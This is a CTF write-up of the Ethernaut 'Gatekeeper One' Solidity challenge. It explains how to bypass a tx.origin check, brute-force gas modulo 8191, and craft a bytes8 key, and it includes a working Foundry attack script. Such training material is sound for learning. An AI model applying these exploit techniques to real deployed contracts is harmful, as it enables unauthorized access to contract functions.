---
title: "Gatekeeper One"
date: 2026-01-07T00:00:00+00:00
draft: false
author: "Koyphshi"
description: "Passing three gates to become the entrant of GatekeeperOne"
categories: ["Blockchain"]
tags: ["ethernaut", "solidity", "gas", "evm", "type-casting"]
math: true
code:
  maxShownLines: 50
toc:
  enable: true
  auto: true
---

in this challenge our goal is to pass the three gates we have

<!--more-->

{{< admonition type="info" title="Challenge Info" open="true" >}}
- **Platform**: Ethernaut
- **Challenge**: Gatekeeper One
- **Category**: Blockchain
{{< /admonition >}}

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

the first gate requires `msg.sender != tx.origin`, we can pass this by calling from a contract

for the second gate:

```solidity
modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
}
```

`gasleft()` is a built-in function that returns the gas left from the original gas provided when we made the call, when we make a call to a contract a specific amount of gas is sent in the original transaction, and then for each operation the gas gets consumed, and then when the contract makes an external call to another contract we can either make the call without specifying the amount to use by doing `address(target).call(msg.data)` or we can specify it by using `address(target).call{gas : G}(msg.data)`

now if we use the second option, at the moment the challenge contract calls `gasleft()` it will be equal to `G - C` where C is the gas consumed from G before we reach the check

so the right thing to do is sending `8191*k + i` where k is some small multiplier and i is from 0 to 8191, why ?

because our goal is to have `G - C = 0 mod (8191)` where C is unknown, which is:
`G = C mod (8191)` so we will have `8191*k + i = C mod (8191)` which is `i = C mod (8191)` so `i` should cover all the values in `[0,8191]`

using a multiplier k is needed because the gas amount might be too small and the transaction would revert

for the third gate:

```solidity
modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
}
```

lets break it down:

**part one:** `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`

this means when counting from the lsb the 3rd and 4th bytes should be `0000` because `uint32` takes the last 4 bytes and `uint16` takes the last 2 bytes, and when compared the compiler adds 2 null bytes to the left of the 2 bytes

**part two:** `uint32(uint64(_gateKey)) != uint64(_gateKey)`

this means the left half (bytes 5-8) should be different from `00000000`

**part three:** `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`

this is similar to the first one but it says the last 2 bytes should be equal to the last 2 bytes of our EOA address

with all that we can create a solver script:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract attack {
  GatekeeperOne gate;
  constructor(GatekeeperOne _gate) payable {
    gate = _gate;
  }

  function pwn(uint i) external {
    bytes8 key = bytes8(uint64(0x000100009ebb));

    (bool res ,) = address(gate).call{gas : 8191*4 + i}(abi.encodeWithSignature("enter(bytes8)",key));
    if (res) {
      console.log(i);
    }

   }
}

contract Solver is Script {
  GatekeeperOne instance = GatekeeperOne(0x851C17f6E6bA8a81231850913499a4da77a94CCA);

  function run() external {
     console.log(instance.entrant());
     vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
     attack p = new attack(instance);
     for (uint i = 0;i <8191;i++) {
     p.pwn(i);
     }
     console.log(instance.entrant());
  }
}
```

we run this locally and recover the correct `i` value, then we just send one transaction using that value and the challenge is solved
